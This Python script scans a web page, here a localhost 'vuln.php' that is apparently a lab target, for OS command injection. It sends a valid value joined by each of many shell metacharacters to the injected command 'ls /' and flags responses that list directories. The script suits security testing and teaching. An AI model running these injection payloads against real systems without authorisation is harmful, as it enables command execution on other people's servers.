import requests
#the url of the target machine
url = "http://localhost:8000/vuln.php"
data="127.0.0.1" #valid data to be added to the field
cmd="ls /" #malicious command to be injected
shell_metacharacters = [';','|','&','&&','||','$','>','>>','<','`','$()','\\','*','?','~','(', ')','[', ']','\n','\r'] #better to not change this unless you want to add your  own
outputs=['tmp','bin','boot','data','etc'] # this should be changed according the cmd variable
print("[*] Scanning for command injection vulnerabilities...\n")
for i in shell_metacharacters:
    payload = data + i + cmd
    response = requests.get(url, params={'data': payload})
    for j in outputs:
        if j in response.text:
            print(f"[!!] Injection likely with metacharacter '{i}'")
            print(f"     Payload: {payload}")
            print("-" * 60)
